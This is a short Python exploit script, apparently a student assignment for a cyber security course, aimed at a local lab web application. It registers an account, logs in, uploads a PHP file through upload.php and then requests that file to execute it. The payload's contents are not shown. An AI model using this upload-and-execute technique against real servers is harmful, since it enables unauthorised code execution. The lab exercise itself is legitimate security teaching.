"""
Kyle Leibowitz
CS461 Cyber Security
Michael Tsiserdekis

Plan:
Go after upload.php
Register account, login, upload malicious file, and execute it.
"""

import requests

#Create Account
#Need to give Name, Last Name, Email, Password and Submit
ACCOUNT = 'http://localhost:8015/music-copyright/cgi-bin/account.php'
DATA = {"first": "Kyle",
        "last": "theGod",
        "email": "god@realEmail.com",
        "password": "1234"}
R = requests.post(ACCOUNT, DATA)
# Log in
# Need to give it email & password
with requests.session() as s:
    LOGIN = 'http://localhost:8015/music-copyright/cgi-bin/login.php'
    DATA = {"email": "god@realEmail.com",
            "password": "1234"}
    MYLOGIN = s.post(LOGIN, DATA)
    # Upload exploit
    UPLOAD = 'http://localhost:8015/music-copyright/cgi-bin/upload.php'
    MYFILE = {'file': open('notAnExploit.php', 'rb')}
    CALL = s.post(UPLOAD, files=MYFILE)
#Call malicious code
URL = 'http://localhost:8015/music-copyright/cgi-bin/uploads/notAnExploit.php'
CALL = s.post(URL)
print(CALL.text)
